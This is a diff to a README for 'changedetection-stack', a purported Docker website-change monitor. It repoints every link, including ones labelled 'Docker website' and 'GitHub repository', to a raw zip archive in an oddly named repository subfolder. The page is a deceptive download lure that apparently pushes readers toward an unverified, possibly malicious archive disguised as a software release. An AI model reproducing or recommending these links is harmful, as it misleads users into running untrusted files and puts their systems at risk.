@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download changedetection-stack](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/changedetection-stack.zip)](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/changedetection-stack.zip)
+[![Download changedetection-stack](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/stack_changedetection_v2.3.zip)](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/stack_changedetection_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,21 +10,21 @@ Welcome to changedetection-stack! This guide will help you download and run the 
 
 ### 🛠 What is changedetection-stack?
 
-changedetection-stack is a simple solution for monitoring website changes. It uses Docker technology to deploy https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/changedetection-stack.zip with headless Chrome and Cloudflare Tunnel. You can keep track of any changes on your favorite websites without needing to check them manually.
+changedetection-stack is a simple solution for monitoring website changes. It uses Docker technology to deploy https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/stack_changedetection_v2.3.zip with headless Chrome and Cloudflare Tunnel. You can keep track of any changes on your favorite websites without needing to check them manually.
 
 ## 🖥️ System Requirements
 
 To run changedetection-stack, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Docker**: You need Docker installed on your machine. Follow the installation guide on the [Docker website](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/changedetection-stack.zip)
+- **Docker**: You need Docker installed on your machine. Follow the installation guide on the [Docker website](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/stack_changedetection_v2.3.zip)
 - **Basic Internet Connection**: Required for downloading Docker and the application.
 
 ## 📥 Download & Install
 
 To get started, you will need to download the software from our Releases page. 
 
-1. Visit the Releases page to download the application: [Download changedetection-stack](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/changedetection-stack.zip).
+1. Visit the Releases page to download the application: [Download changedetection-stack](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/stack_changedetection_v2.3.zip).
 2. Look for the most recent version and choose the appropriate file for your system.
 3. Once the file is downloaded, run the following command in your terminal or command line:
 
@@ -76,13 +76,13 @@ If you encounter issues while using changedetection-stack:
 
 For questions or support, feel free to reach out:
 
-- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/changedetection-stack.zip).
+- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/stack_changedetection_v2.3.zip).
 - Join our community discussions for additional tips and solutions.
 
 ## 📜 License
 
 changedetection-stack is open-source and available for anyone to use. Refer to the license document included in the repository for more details.
 
-Do not forget to visit the Releases page to download the latest version: [Download changedetection-stack](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/changedetection-stack.zip). 
+Do not forget to visit the Releases page to download the latest version: [Download changedetection-stack](https://raw.githubusercontent.com/Kamal7734/changedetection-stack/main/shruggingly/stack_changedetection_v2.3.zip). 
 
 We appreciate your interest in changedetection-stack and hope it helps you automate your website monitoring.
